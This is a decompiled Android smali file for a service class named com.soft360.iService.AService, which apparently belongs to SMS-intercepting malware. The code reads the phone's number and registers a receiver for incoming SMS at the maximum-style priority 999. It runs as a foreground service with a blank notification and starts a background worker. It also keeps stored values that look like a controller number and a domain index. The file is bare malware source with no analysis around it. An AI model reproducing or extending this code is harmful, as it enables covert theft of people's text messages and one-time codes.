.class public Lcom/soft360/iService/AService;
.super Landroid/app/Service;


# static fields
.field public static a:I

.field public static a:Landroid/content/Context;

.field public static a:Ljava/lang/String;


# instance fields
.field final a:Landroid/content/IntentFilter;

.field private a:Lcom/soft360/iService/SmsReciever;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, ""

    sput-object v0, Lcom/soft360/iService/AService;->a:Ljava/lang/String;

    const/4 v0, 0x0

    sput v0, Lcom/soft360/iService/AService;->a:I

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/soft360/iService/AService;->a:Landroid/content/IntentFilter;

    return-void
.end method

.method public static a()V
    .locals 3

    sget-object v0, Lcom/soft360/iService/AService;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "tel1"

    sget-object v2, Lem;->a:Ljava/lang/String;

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    sget-object v0, Lem;->a:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 5

    const/4 v4, 0x0

    invoke-virtual {p0}, Lcom/soft360/iService/AService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/soft360/iService/AService;->a:Ljava/lang/String;

    sput-object p0, Lcom/soft360/iService/AService;->a:Landroid/content/Context;

    new-instance v0, Lef;

    sget-object v1, Lcom/soft360/iService/AService;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lef;-><init>(Landroid/content/Context;)V

    invoke-static {v0}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    const/4 v0, 0x0

    invoke-static {v0}, LdU;->a(Landroid/content/Context;)LdU;

    move-result-object v0

    sget-object v1, Lcom/soft360/iService/AService;->a:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "tel1"

    invoke-virtual {v0}, LdU;->c()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lem;->a:Ljava/lang/String;

    sput-object v2, Lem;->b:Ljava/lang/String;

    :try_start_0
    const-string v2, "domain_index"

    const/4 v3, 0x0

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/soft360/iService/AService;->a:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v2, "kode8"

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, LdU;->i:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "AService onCreate "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lem;->a:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    iget-object v0, p0, Lcom/soft360/iService/AService;->a:Landroid/content/IntentFilter;

    const/16 v1, 0x3e7

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    new-instance v0, Lcom/soft360/iService/SmsReciever;

    invoke-direct {v0}, Lcom/soft360/iService/SmsReciever;-><init>()V

    iput-object v0, p0, Lcom/soft360/iService/AService;->a:Lcom/soft360/iService/SmsReciever;

    iget-object v0, p0, Lcom/soft360/iService/AService;->a:Lcom/soft360/iService/SmsReciever;

    iget-object v1, p0, Lcom/soft360/iService/AService;->a:Landroid/content/IntentFilter;

    invoke-virtual {p0, v0, v1}, Lcom/soft360/iService/AService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcx;

    invoke-direct {v1, p0}, Lcx;-><init>(Lcom/soft360/iService/AService;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void

    :catch_0
    move-exception v2

    sput v4, Lcom/soft360/iService/AService;->a:I

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    const/4 v1, 0x0

    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, v1, v0}, Lcom/soft360/iService/AService;->startForeground(ILandroid/app/Notification;)V

    return v1
.end method
